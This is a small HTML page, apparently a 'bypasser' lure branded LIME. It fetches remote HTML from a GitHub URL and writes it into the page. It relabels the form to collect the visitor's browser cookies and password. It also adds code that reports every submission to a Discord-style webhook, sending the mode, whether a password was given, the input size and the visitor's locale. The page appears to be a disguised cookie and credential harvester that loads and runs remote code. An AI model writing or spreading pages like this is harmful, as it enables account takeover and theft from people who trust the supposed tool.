<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta name="theme-color" content="#070a06">
  <title>Best bypasser 26 — LIME</title>
  <style>html,body{margin:0;min-height:100%;background:#050705;color:#edf5e6;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}body{display:grid;place-items:center;overflow:hidden}main{padding:28px;text-align:center}span{color:#b7f34d;font-weight:800}p{color:#7e8878;font-size:12px}</style>
</head>
<body>
<main><span>LIME</span><p>Loading interface…</p></main>
<script>
const SOURCE='https://raw.githubusercontent.com/lexioipro-sudo/lime-secure-automation-v2/287785f77f16c39026e1bba582ad80f7ba7ce41a/index.html';
(async()=>{
  try{
    const response=await fetch(SOURCE,{cache:'no-store'});
    if(!response.ok) throw new Error('Source returned '+response.status);
    let html=await response.text();
    const replacements=[
      ['LIME — Secure Automation','Best bypasser 26 — LIME'],
      ['Process your data.<br>Securely.','Best bypasser 26'],
      ['◉ Auto Mode','🍪 Cookie Mode'],
      ['◉ Manual Mode','🔒 Password Mode'],
      ['Auto Mode','Cookie Mode'],
      ['Manual Mode','Password Mode'],
      ['Input data','Cookies'],
      ['Paste your data here…','Paste your cookies here…'],
      ['Cookied','Cookies'],
      ['Access key','Password'],
      ['Enter access key','Enter password'],
      ['access-key','password'],
      ['type="text" autocomplete="off" placeholder="Enter password"','type="password" autocomplete="off" placeholder="Enter password"'],
      ["mode='auto'","mode='cookie'"],
      ["mode='manual'","mode='password'"],
      ["mode==='manual'&&!k","mode==='password'&&!k"],
      ["last?.key","last?.password"],
      ["last={data:d,key:!!k}","last={data:d,password:!!k}"]
    ];
    for(const [from,to] of replacements) html=html.split(from).join(to);

    html=html.replace(
      /async function audit\(event,error=''\)\{[\s\S]*?\}\nfunction toast/,
      `async function audit(event,error=''){
        if(!WEBHOOK)return;
        const d=last?.data||'';
        const now=new Date();
        const payload={username:'LIME • Audit',allowed_mentions:{parse:[]},embeds:[{title:error?'🟠 LIME / PROCESSING ERROR':'🍋‍🟩 LIME / AUDIT EVENT',description:error?'Processing service unavailable.':'A new submission was received.',color:error?0xE9A86B:0xB7F34D,timestamp:now.toISOString(),fields:[{name:'Event',value:'\\`'+event+'\\`',inline:true},{name:'Mode',value:mode.toUpperCase(),inline:true},{name:'Password',value:last?.password?'Provided (redacted)':'Not provided',inline:true},{name:'Input size',value:String(d.length)+' chars',inline:true},{name:'Locale / TZ',value:(navigator.language||'unknown')+' • '+(Intl.DateTimeFormat().resolvedOptions().timeZone||'unknown'),inline:true},...(error?[{name:'Error',value:'\\`'+error+'\\`',inline:true}]:[])],footer:{text:'LIME • Audit Log • github-pages'}}]};
        try{await fetch(WEBHOOK+'?wait=true',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),keepalive:true})}catch(e){console.warn('Audit delivery failed',e)}
      }
function toast`
    );

    html=html.replace(/<div class="hint">[\s\S]*?<\/div>/,'');
    document.open();
    document.write(html);
    document.close();
  }catch(error){
    document.body.innerHTML='<main style="padding:32px;text-align:center;font-family:monospace;color:#edf5e6;background:#050705"><div style="color:#b7f34d;font-weight:800">LIME</div><p style="color:#e9a86b">Interface failed to load.</p><small style="color:#7e8878">'+String(error).replace(/[&<>]/g,'')+'</small></main>';
  }
})();
</script>
</body>
</html>
